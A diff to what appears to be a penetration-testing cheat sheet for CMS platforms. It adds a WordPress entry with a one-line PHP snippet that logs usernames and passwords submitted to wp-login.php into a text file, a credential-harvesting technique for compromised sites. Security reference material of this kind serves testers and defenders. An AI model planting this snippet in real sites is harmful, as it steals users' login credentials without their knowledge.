@@ -13,6 +13,11 @@
 - [Droopescan - https://github.com/droope/droopescan](https://github.com/droope/droopescan)
 
 ## Wordpress
+Log passwords from wp-login.php
+
+```
+file_put_contents("creds.txt",$_POST['log']." - ".$_POST['pwd'])
+```
 
 ### Tools
 - [WPScan - https://github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan)
